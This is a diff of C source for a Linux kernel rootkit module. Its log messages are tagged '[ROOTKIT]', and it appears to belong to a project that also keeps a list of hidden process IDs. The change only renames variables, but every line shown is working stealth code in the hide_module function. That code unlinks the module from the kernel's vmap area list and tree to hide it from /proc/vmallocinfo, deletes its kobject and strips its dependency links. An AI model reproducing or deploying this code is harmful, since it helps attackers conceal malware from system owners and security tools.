@@ -20,26 +20,26 @@ LIST_HEAD(hidden_pids_list);
 
 void hide_module(void)
 {
-    struct vmap_area *vma;
-    struct vmap_area *vma_tmp;
-    struct module_use *use;
-    struct module_use *use_tmp;
-    struct list_head *vma_list;
-    struct rb_root *vma_root;
+    struct vmap_area *p_vma;
+    struct vmap_area *p_vma_tmp;
+    struct module_use *p_use;
+    struct module_use *p_use_tmp;
+    struct list_head *p_vma_list;
+    struct rb_root *p_vma_root;
 
-    vma_list = (struct list_head *)lookup_name("vmap_area_list");
-    vma_root = (struct rb_root *)lookup_name("vmap_area_root");
+    p_vma_list = (struct list_head *)lookup_name("vmap_area_list");
+    p_vma_root = (struct rb_root *)lookup_name("vmap_area_root");
 
-    pr_info("[ROOTKIT] vma_list: %p\n", vma_list);
-    pr_info("[ROOTKIT] vma_root: %p\n", vma_root);
+    pr_info("[ROOTKIT] p_vma_list: %p\n", p_vma_list);
+    pr_info("[ROOTKIT] p_vma_root: %p\n", p_vma_root);
 
     // Remove module from /proc/vmallocinfo
-    list_for_each_entry_safe (vma, vma_tmp, vma_list, list) {
-        if ((unsigned long)THIS_MODULE > vma->va_start &&
-            (unsigned long)THIS_MODULE < vma->va_end) {
-            pr_info("[ROOTKIT] * Removing vma %p...", vma);
-            list_del(&vma->list);
-            rb_erase(&vma->rb_node, vma_root);
+    list_for_each_entry_safe (p_vma, p_vma_tmp, p_vma_list, list) {
+        if ((unsigned long)THIS_MODULE > p_vma->va_start &&
+            (unsigned long)THIS_MODULE < p_vma->va_end) {
+            pr_info("[ROOTKIT] * Removing VMAP area %p...", p_vma);
+            list_del(&p_vma->list);
+            rb_erase(&p_vma->rb_node, p_vma_root);
             pr_cont(" done\n");
         }
     }
@@ -51,13 +51,13 @@ void hide_module(void)
     kobject_del(&THIS_MODULE->mkobj.kobj);
 
     // Clear dependency list (see kernel/module.c)
-    list_for_each_entry_safe (use, use_tmp, &THIS_MODULE->target_list, target_list) {
-        pr_info("[ROOTKIT] * Removing dependency source %p, target %p...", use->source->name,
-                use->target->name);
-        list_del(&use->source_list);
-        list_del(&use->target_list);
-        sysfs_remove_link(use->target->holders_dir, THIS_MODULE->name);
-        kfree(use);
+    list_for_each_entry_safe (p_use, p_use_tmp, &THIS_MODULE->target_list, target_list) {
+        pr_info("[ROOTKIT] * Removing dependency source %p, target %p...", p_use->source->name,
+                p_use->target->name);
+        list_del(&p_use->source_list);
+        list_del(&p_use->target_list);
+        sysfs_remove_link(p_use->target->holders_dir, THIS_MODULE->name);
+        kfree(p_use);
         pr_cont(" done\n");
     }
 
